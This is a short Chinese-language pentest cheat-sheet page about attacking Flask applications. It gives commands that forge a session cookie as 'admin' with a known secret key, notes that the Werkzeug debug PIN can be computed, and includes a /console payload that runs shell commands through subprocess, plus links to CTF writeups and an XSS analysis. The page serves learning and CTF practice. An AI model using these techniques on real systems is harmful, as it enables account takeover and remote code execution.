---
title: flask
createTime: 2024/10/16 20:20:40
permalink: /learn/quyjlogk/
---

# flask

---

## 免责声明

`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`

---

## session 伪造

flask-session 的三部分为 json->zlib->base64 后的源字符串. 时间戳. hmac 签名信息

**相关文章**

- [flask session 伪造 admin 身份](https://blog.csdn.net/since_2020/article/details/119543172)

**相关工具**

- [noraj/flask-session-cookie-manager](https://github.com/noraj/flask-session-cookie-manager)
  ```bash
  python3 flask_session_cookie_manager3.py decode -s "thisiskey" -c "eyJ1c2VybmFtZSI6eyIgYiI6IllXUnRhVzQ9In19.YWfurA.sHD-E9MuX4QZJQ4cU07WYykbJZU" # 解密
  python3 flask_session_cookie_manager3.py encode -s "thisiskey" -t "{'username': b'admin'}"  # 加密
  ```

**writeup**

- [[HCTF 2018] admin](https://darkwing.moe/2019/11/04/HCTF-2018-admin/)
- [BUUCTF N1BOOK [第一章 web 入门]](https://blog.csdn.net/RABCDXB/article/details/115189884)

---

## flask-debug

**简述**

debug 模式需要验证 pin, 而 pin 并非真随机值, 根据机器上的参数可以计算出来

当然,如果目标配置了 `WERKZEUG_DEBUG_PIN=off` 那就不需要 pin 了 😂

**相关文章**

- [Flask 渗透 01：debug 模式中的 RCE](https://anzu.link/pages/204626/)
- [Flask RCE Debug Mode](http://ghostlulz.com/flask-rce-debug-mode/)
- [Flask 开启 debug 时 PIN 码的安全性问题](https://xz.aliyun.com/t/11036)
- [Flask debug 模式 PIN 码生成机制安全性研究笔记](https://zhuanlan.zhihu.com/p/32336971)

**POC | Payload | exp**

`/console`

```py
import subprocess;out = subprocess.Popen(['whoami'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT);stdout,stderr = out.communicate();print(stdout);
```

---

## flask-debug xss

**相关文章**

- [Flask Debugger 页面上的通用 XSS 漏洞分析和挖掘过程记录](http://blog.neargle.com/2016/09/21/flask-src-review-get-a-xss-from-debuger/)
- https://github.com/pallets/werkzeug/pull/1001
